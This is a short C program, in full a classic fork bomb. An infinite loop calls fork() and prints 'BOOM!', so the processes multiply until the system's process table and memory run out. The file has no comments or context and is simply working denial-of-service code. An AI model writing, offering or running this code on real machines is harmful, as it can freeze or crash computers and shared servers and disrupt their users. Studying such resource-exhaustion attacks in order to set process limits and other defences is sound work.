#include <stdio.h> 
#include <sys/types.h> 
int main() 
{ 
	while(1){
    	fork(); 
    	printf("BOOM!");
	}
    return 0; 
}